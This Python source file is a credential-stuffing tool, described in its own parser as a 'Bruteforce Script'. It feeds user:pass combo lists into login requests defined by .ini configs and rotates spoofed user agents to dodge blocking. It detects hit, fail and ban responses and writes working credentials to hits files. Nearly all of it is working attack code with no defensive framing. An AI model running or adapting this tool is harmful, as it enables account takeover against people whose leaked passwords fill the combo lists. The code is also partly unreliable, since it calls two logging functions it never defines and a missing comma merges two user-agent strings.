import random
import requests
import colorama
import os
import argparse
import configparser  # Added for config parsing
from colorama import Fore, Style
from tqdm import tqdm
from datetime import datetime
from urllib.parse import quote_plus

colorama.init(autoreset=True)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.6312.52 Mobile/15E148 Safari/604.1'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.5 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.7 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.5.3 Chrome/114.0.5735.289 Electron/25.8.1 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) graphwise/4.6.1 Chrome/116.0.5845.228 Electron/26.6.7 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.4.14 Chrome/114.0.5735.289 Electron/25.8.1 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.5 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.5 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.5.3 Chrome/114.0.5735.289 Electron/25.8.1 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.7 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 14; M2012K11AG Build/UKQ1.240624.001)',
    'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; HarmonyOS; HLK-AL00; HMSCore 6.10.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.2.332 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.128 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.128 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.4.16 Chrome/114.0.5735.289 Electron/25.8.1 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    # Add more user agents here
]

# Argument parser for handling -log
parser = argparse.ArgumentParser(description="Bruteforce Script")
parser.add_argument("-log", action="store_true", help="Enable logging of GET/POST responses")
args = parser.parse_args()

def list_files_in_directory(directory, extension):
    """Lists files in a directory with a given extension."""
    return [f for f in os.listdir(directory) if f.endswith(extension)]

def prompt_user_to_select_file(directory, extension, description):
    """Prompts the user to select a file from the directory."""
    files = list_files_in_directory(directory, extension)
    if not files:
        print(f"{Fore.RED}No {description} files found in {directory}")
        return None
    
    print(f"\n{Fore.YELLOW}Available {description} files:")
    for i, file in enumerate(files):
        print(f"{i + 1}. {file}")
    
    choice = input(f"{Fore.GREEN}Select a {description} file (enter number): ")
    
    try:
        index = int(choice) - 1
        if index < 0 or index >= len(files):
            raise ValueError
        return os.path.join(directory, files[index])
    except ValueError:
        print(f"{Fore.RED}Invalid selection.")
        return None

def load_combos(combo_file):
    """Loads combos (user:pass) from the selected combo file."""
    with open(combo_file, 'r') as file:
        combos = [line.strip().split(':') for line in file if ':' in line]
    return combos

def process_combo(config, combo, config_name_without_ext):
    """Processes a single user:pass combo using the given config."""
    user, password = combo
    headers = {
        'User-Agent': random.choice(USER_AGENTS)
    }

    log_file_path = None
    if args.log:
        url = safe_get(config, 'get', 'url', safe_get(config, 'post', 'url', ''))
        if url:
            log_file_path = create_log_file(url)  # Create log file if -log is passed

    response = None

    # Check if 'get' section exists and make GET request
    if 'get' in config:
        try:
            url = config['get']['url']
            headers['Content-Type'] = config['get'].get('applicationType', 'application/x-www-form-urlencoded')
            headers['Cookie'] = config['get'].get('cookie', '')
            
            response = requests.get(url, headers=headers)
            if args.log:
                log_response(log_file_path, "GET", url, None, response.text)  # Log the response if -log is passed
        except requests.RequestException as e:
            print(f"{Fore.RED}Error during GET request: {e}")
            return "fail"

    # Check if 'post' section exists and make POST request
    if 'post' in config:
        try:
            post_data = config['post']['postData'].replace('{user}', user).replace('{pass}', password)
            encoded_post_data = encode_post_data(post_data)

            url = config['post']['url']
            headers['Content-Type'] = config['post'].get('applicationType', 'application/x-www-form-urlencoded')
            headers['Cookie'] = config['post'].get('cookie', '')

            response = requests.post(url, headers=headers, data=encoded_post_data)
            if args.log:
                log_response(log_file_path, "POST", url, encoded_post_data, response.text)  # Log the response if -log is passed
        except requests.RequestException as e:
            print(f"{Fore.RED}Error during POST request: {e}")
            return "fail"

    if response is None:
        print(f"{Fore.YELLOW}No GET or POST request made for {user}:{password}, skipping.")
        return "fail"

    # Check keycheck for success or failure
    ban_string = safe_get(config, 'keycheck', 'banString')
    fail_string = safe_get(config, 'keycheck', 'failString')
    hit_string = safe_get(config, 'keycheck', 'hitString')

    # Check if hit_string is found in the response text
    is_hit = hit_string and hit_string in response.text
    is_ban = ban_string and ban_string in response.text
    is_fail = fail_string and fail_string in response.text

    if is_ban:
        print(f"{Fore.RED}Ban detected. Returning to main menu.")
        return "ban"

    if is_fail:
        print(f"{Fore.YELLOW}Failed: {user}:{password}")
        return "fail"

    if is_hit:
        print(f"{Fore.GREEN}Hit detected in keycheck: {user}:{password}")
        return handle_success(config, user, password, response.text, config_name_without_ext)

    # Check for keycheckSTEP
    step_ban_string = safe_get(config, 'keycheckSTEP', 'banString')
    step_fail_string = safe_get(config, 'keycheckSTEP', 'failString')
    step_hit_string = safe_get(config, 'keycheckSTEP', 'hitString')

    # Check if hit_string is found in the response text for keycheckSTEP
    step_is_hit = step_hit_string and step_hit_string in response.text
    step_is_ban = step_ban_string and step_ban_string in response.text
    step_is_fail = step_fail_string and step_fail_string in response.text

    if step_is_ban:
        print(f"{Fore.RED}Ban detected in keycheckSTEP. Returning to main menu.")
        return "ban"

    if step_is_fail:
        print(f"{Fore.YELLOW}Failed in keycheckSTEP: {user}:{password}")
        return "fail"

    if step_is_hit:
        print(f"{Fore.GREEN}Hit detected in keycheckSTEP: {user}:{password}")
        # Just report the hit but do not save it
        return "hit step"

    # Check for [RECORDHIT] section in config to treat as a hit regardless of keycheck
    if 'RECORDHIT' in config:
        print(f"{Fore.GREEN}[RECORDHIT] found in config, treating as a success for {user}:{password}")
        return handle_success(config, user, password, response.text, config_name_without_ext, force_recordhit=True)

    # Check if the [parse] section exists before trying to access parseHalf1 and parseHalf2
    if 'parse' in config:
        parse_half_1 = safe_get(config, 'parse', 'parseHalf1', "<NULL>")
        parse_half_2 = safe_get(config, 'parse', 'parseHalf2', "<NULL>")

        if parse_half_1 == "<NULL>" and parse_half_2 == "<NULL>":
            print(f"{Fore.YELLOW}parseHalf1 and parseHalf2 are <NULL>. Checking for [RECORDHIT] next.")
            if 'RECORDHIT' in config:
                print(f"{Fore.GREEN}[RECORDHIT] found after NULL parsing. Treating {user}:{password} as a hit.")
                return handle_success(config, user, password, response.text, config_name_without_ext, force_recordhit=True)
            else:
                print(f"{Fore.YELLOW}No [RECORDHIT] found. Skipping {user}:{password}.")
                return "skip"
        else:
            # Handle the case where both parsing variables are set
            parse_hit = extract_between(response.text, parse_half_1, parse_half_2)
            if parse_hit:
                print(f"{Fore.GREEN}Hit! {user}:{password} {parse_hit}")
                return handle_success(config, user, password, response.text, config_name_without_ext)

    # If the parse section does not exist, we can just skip to the next logic
    return "fail"


def handle_success(config, user, password, response_text, config_name_without_ext, force_recordhit=False):
    """Handles a successful hit by recording the credentials and parsed data if applicable."""
    if force_recordhit:
        print(f"{Fore.GREEN}Hit! {user}:{password} (No parse data)")
        save_hit(user, password, None, config_name_without_ext)
        return "hit"

    # If we are here, it means we have to check for parsing again
    parse_half_1 = safe_get(config, 'parse', 'parseHalf1')
    parse_half_2 = safe_get(config, 'parse', 'parseHalf2')

    parse_hit = None
    if parse_half_1 and parse_half_2:
        parse_hit = extract_between(response_text, parse_half_1, parse_half_2)
        if parse_hit:
            print(f"{Fore.GREEN}Hit! {user}:{password} {parse_hit}")
        else:
            print(f"{Fore.GREEN}Hit! {user}:{password} (No parse data)")

    # Save hit and parse data (if available)
    save_hit(user, password, parse_hit, config_name_without_ext)
    return "hit"


def safe_get(config, section, key, default=None):
    """Safely retrieves a key from the config object, handling both configparser and dict."""
    if isinstance(config, dict):
        return config.get(section, {}).get(key, default)
    if config.has_section(section):
        return config.get(section, key, fallback=default)
    return default

def extract_between(text, part1, part2):
    """Extracts the text between two substrings."""
    try:
        start = text.index(part1) + len(part1)
        end = text.index(part2, start)
        return text[start:end].strip()
    except ValueError:
        return None

def save_hit(user, password, parse_hit, config_name_without_ext):
    """Saves the hit credentials and parsed data to the appropriate file."""
    hits_dir = f'./hits/{config_name_without_ext}'
    if not os.path.exists(hits_dir):
        os.makedirs(hits_dir)
    
    hit_file = os.path.join(hits_dir, 'hits.txt')
    
    with open(hit_file, 'a') as f:
        if parse_hit:
            f.write(f"Hit: {user}:{password} - {parse_hit}\n")
        else:
            f.write(f"Hit: {user}:{password}\n")
    
    print(f"{Fore.GREEN}Credentials saved: {user}:{password}")

def encode_post_data(post_data):
    """Encodes the POST data using URL encoding."""
    encoded_data = '&'.join([f"{quote_plus(k)}={quote_plus(v)}" for k, v in [pair.split('=') for pair in post_data.split('&')]])
    return encoded_data

def get_config_name_without_ext(config_path):
    """Extracts the config name without extension from the config file path."""
    return os.path.splitext(os.path.basename(config_path))[0]

# Main logic to pick files
config_file = prompt_user_to_select_file("./configs", ".ini", "config")
if config_file:
    config = configparser.ConfigParser()
    config.read(config_file)  # Parse the config file properly

    config_name_without_ext = get_config_name_without_ext(config_file)

    combo_file = prompt_user_to_select_file("./combos", ".txt", "combo")
    if combo_file:
        combos = load_combos(combo_file)
        # Loop through combos and process
        for combo in tqdm(combos, desc="Processing combos"):
            process_combo(config, combo, config_name_without_ext)
